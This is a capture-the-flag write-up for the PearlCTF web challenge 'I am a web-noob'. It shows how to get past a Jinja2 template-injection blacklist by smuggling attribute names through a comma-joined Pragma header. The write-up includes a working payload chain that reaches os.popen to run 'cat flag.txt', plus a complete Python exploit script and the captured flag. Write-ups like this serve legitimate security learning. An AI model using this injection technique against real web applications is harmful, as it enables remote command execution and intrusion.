# I am a web-noob

```
Maybe noobs create the most secure web applications. Or maybe not.
```

The blacklist included many of the common SSTI techniques such as `{{}}`, `join`, `config`, `items`. All these could be verified with the source given.

An interesting stack-overflow thread where the discussion of passing same header names with different values were considered.

One of the answers were this, using this methodology leads to a cleaner solution. This removes the effort of figuring out the indexes and other tedious work.
``` python

import collections
import requests
import html

def flatten_headers(headers):
    for (k, v) in list(headers.items()):
        if isinstance(v, collections.abc.Iterable):
           headers[k] = ','.join(v)
```

We can use the Pragma header for our convenience. 

```python

headers = {'Pragma': 
            ['__globals__', 
            '__getitem__', 
            '__builtins__', 
            '__import__', 
            'os', 
            'popen', 
            'cat flag.txt', 
            'read']}
flatten_headers(headers)

```

Our payload which uses the given function
```python

payload = "{% print(lipsum|attr(request.pragma.0)|attr(request.pragma.1)(request.pragma.2)|attr(request.pragma.1)(request.pragma.3)(request.pragma.4)|attr(request.pragma.5)(request.pragma.6)|attr(request.pragma.7)()) %}"

```

Our final script

```python

import collections
import requests
import html


def flatten_headers(headers):
    for (k, v) in list(headers.items()):
        if isinstance(v, collections.abc.Iterable):
           headers[k] = ','.join(v)

headers = {'Pragma': 
            ['__globals__', 
            '__getitem__', 
            '__builtins__', 
            '__import__', 
            'os', 
            'popen', 
            'cat flag.txt', 
            'read']}
flatten_headers(headers)

url = "https://noob-login.ctf.pearlctf.in/?user=" + payload
r = requests.get(url, headers=headers)
print(html.unescape(r.text))

```
The flag is `pearl{W4s_my_p4ge_s3cur3_en0ugh_f0r_y0u?}`

